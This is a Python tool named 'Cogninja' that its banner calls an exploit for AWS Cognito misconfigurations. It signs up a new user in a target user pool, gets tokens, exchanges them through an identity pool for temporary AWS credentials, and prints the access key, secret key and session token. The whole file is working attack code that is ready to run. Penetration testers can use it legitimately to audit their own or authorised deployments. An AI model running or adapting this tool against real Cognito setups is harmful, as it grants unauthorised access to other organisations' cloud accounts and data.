import argparse
import boto3
from botocore.exceptions import ClientError
from colorama import Fore, Style, init

init(autoreset=True)

def sign_up_user(cognito_idp_client, user_pool_client_id, username, password, email, birthdate, given_name, family_name):
    try:
        response = cognito_idp_client.sign_up(
            ClientId=user_pool_client_id,
            Username=username,
            Password=password,
            UserAttributes=[
                {'Name': 'email', 'Value': email},
                {'Name': 'birthdate', 'Value': birthdate},
                {'Name': 'given_name', 'Value': given_name},
                {'Name': 'family_name', 'Value': family_name}
            ]
        )
        print(f"{Fore.GREEN}[USER SIGNED UP SUCCESSFULLY]")
        return True
    
    except ClientError as e:
        error_code = e.response['Error']['Code']
        if error_code == "UsernameExistsException":
            print(f"{Fore.YELLOW}[INFO] - User already exists. Proceeding to obtain tokens.")
            return False
        else:
            print(f"{Fore.RED}[ERROR] - Error executing sign-up command: {e}")
            return False

def get_access_token(cognito_idp_client, user_pool_client_id, username, password):
    try:
        response = cognito_idp_client.initiate_auth(
            AuthFlow='USER_PASSWORD_AUTH',
            ClientId=user_pool_client_id,
            AuthParameters={
                'USERNAME': username,
                'PASSWORD': password
            }
        )
        access_token = response['AuthenticationResult']['AccessToken']
        id_token = response['AuthenticationResult']['IdToken']
        return access_token, id_token
    
    except ClientError as e:
        print(f"{Fore.RED}[ERROR] - Error executing command: {e}")
        return None, None

def get_identity_id(cognito_identity_client, identity_pool_id, id_token, region, user_pool_id):
    if not identity_pool_id:
        print(f"{Fore.RED}[ERROR] - Identity Pool ID is required but was not provided.")
        return None
    try:
        response = cognito_identity_client.get_id(
            IdentityPoolId=identity_pool_id,
            Logins={
                f'cognito-idp.{region}.amazonaws.com/{user_pool_id}': id_token
            }
        )
        return response['IdentityId']
    
    except ClientError as e:
        print(f"{Fore.RED}[ERROR] - Error executing get-id command: {e}")
        return None

def get_aws_credentials(cognito_identity_client, identity_id, id_token, user_pool_id, region):
    try:
        response = cognito_identity_client.get_credentials_for_identity(
            IdentityId=identity_id,
            Logins={
                f'cognito-idp.{region}.amazonaws.com/{user_pool_id}': id_token
            }
        )
        return response['Credentials']
    
    except ClientError as e:
        print(f"{Fore.RED}[ERROR] - Error executing command: {e}")
        return None


def main_menu():
    ninja_ascii = r'''
                                    ####///.                                   
                                #########////////*                              
                           ##############//////////////                         
                      ###################///////////////                        
                .########################///////////////                        
            ##########################%%%%%/////////////   ######/////          
            ##################%%%%%%%%%%%%%%%%%%%%%%////   ######/////          
            #########%%%%%%%%%%(                           ######/////          
            #####/////*                                    ######/////          
            #####/////*                                    ######/////          
            #####/////*        ,#########////////*         ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*             *####////              ######/////          
            #####/////*                                    ######/////          
            #####/////*                                   ,,*####/////          
            #####/////*     .,,,,,              ,,,,,,,,,,*///////////          
            #####/////*  #######,,,,,,,,,,,,,,,,,,////////////////////          
             ####/////*  ###############(////////////////////////////           
                         ################///////////////////////                
                         ################//////////////////                     
                            #############////////////*                          
                                 ########///////.                               
                                      (##//                                     

                
                      ____            _   _ _        _       
                     / ___|___   __ _| \ | (_)_ __  (_) __ _ 
                    | |   / _ \ / _` |  \| | | '_ \ | |/ _` |
                    | |__| (_) | (_| | |\  | | | | || | (_| |
                    \____\___/ \__, |_| \_|_|_| |_|/ |\__,_|
                                |___/             |__/       
    '''
    print(f"{Fore.CYAN}{ninja_ascii}")
    print(f"{Fore.YELLOW}[INFO] - Welcome to Cogninja - AWS Cognito Missconfig Exploit")
    print(f"{Fore.YELLOW}[INFO] - Author: {Fore.WHITE}@lv4rela\n")

    parser = argparse.ArgumentParser(description='Cogninja - HELP')
    parser.add_argument('--user_pool_client_id', type=str, required=True, help='ID of the Cognito user pool client.')
    parser.add_argument('--user_pool_id', type=str, required=True, help='ID of the Cognito user pool.')
    parser.add_argument('--username', type=str, required=True, help='Cognito username for the new user, if the user already exists, just use the same')
    parser.add_argument('--password', type=str, required=True, help='Cognito user password, if the user already exists, just use the same')
    parser.add_argument('--email', type=str, required=True, help='Email for the new user.')
    parser.add_argument('--region', type=str, required=True, help='AWS Cognito region.(e.g., us-east-1)')
    parser.add_argument('--identity_pool_id', type=str, required=False, help='Cognito Identity Pool ID (required for Get_AWS_Credentials action)')
    parser.add_argument('--birthdate', type=str, required=False, help='[Optional] birthdate to use as an attribute for the new user')
    parser.add_argument('--given_name', type=str, required=False, help='[Optional] given_name to use as an attribute for the new user')
    parser.add_argument('--family_name', type=str, required=False, help='[Optional] family_name to use as an attribute for the new user')

    args = parser.parse_args()

    
    cognito_idp_client = boto3.client('cognito-idp', region_name=args.region)
    cognito_identity_client = boto3.client('cognito-identity', region_name=args.region)

    # Try to sign up the user
    sign_up_success = sign_up_user(
        cognito_idp_client,
        args.user_pool_client_id,
        args.username,
        args.password,
        args.email,
        args.birthdate,
        args.given_name,
        args.family_name
    )
    
    # Always attempt to get tokens
    access_token, id_token = get_access_token(
        cognito_idp_client,
        args.user_pool_client_id,
        args.username,
        args.password
    )
    
    if access_token and id_token:
        print(f"{Fore.MAGENTA}[ACCESS TOKEN]: {Fore.GREEN}{access_token}")
        print(f"{Fore.MAGENTA}[ID TOKEN]: {Fore.GREEN}{id_token}")

        # Get the identity ID
        identity_id = get_identity_id(
            cognito_identity_client,
            args.identity_pool_id,
            id_token,
            args.region,
            args.user_pool_id
        )
        
        if identity_id:
            aws_credentials = get_aws_credentials(
                cognito_identity_client,
                identity_id,
                id_token,
                args.user_pool_id,
                args.region
            )
            if aws_credentials:
                print(f"{Fore.MAGENTA}[AWS CREDENTIALS]:")
                print(f"  {Fore.CYAN}AccessKeyId: {aws_credentials['AccessKeyId']}")
                print(f"  {Fore.CYAN}SecretKey: {aws_credentials['SecretKey']}")
                print(f"  {Fore.CYAN}SessionToken: {aws_credentials['SessionToken']}")
                print(f"  {Fore.CYAN}Expiration: {aws_credentials['Expiration']}")
            else:
                print(f"{Fore.RED}[ERROR] - Could not obtain AWS credentials.")
        else:
            print(f"{Fore.RED}[ERROR] - Could not obtain identity ID.")
    else:
        print(f"{Fore.RED}[ERROR] - Could not obtain access tokens.")
    
if __name__ == "__main__":
    main_menu()
